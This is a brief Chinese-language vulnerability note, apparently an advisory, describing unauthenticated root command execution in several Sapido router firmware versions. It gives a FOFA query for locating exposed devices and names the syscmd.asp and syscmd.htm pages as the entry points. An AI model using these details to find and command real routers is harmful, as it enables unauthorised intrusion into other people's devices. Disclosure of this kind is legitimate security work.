# Sapido 多款路由器 远程命令执行漏洞


## 漏洞描述


Sapido多款路由器在未授权的情况下，导致任意访问者可以以Root权限执行命令



## 漏洞影响


```plain
BR270n-v2.1.03
BRC76n-v2.1.03
GR297-v2.1.3
RB1732-v2.0.43
```



## FOFA


```plain
app="Sapido-路由器"
```



## 漏洞复现


固件中存在一个asp文件为 **syscmd.asp** 存在命令执行



![202202162237726.png](/uploads/20260518/9ec93b88-0299-4129-867e-b95f65c538bd.png)



访问目标：



```plain
http://xxx.xxx.xxx.xxx/syscmd.asp
http://xxx.xxx.xxx.xxx/syscmd.htm
```



![202202162237444.png](/uploads/20260518/e4ef65ec-8762-4c7f-a3dd-af2732374d4a.png)
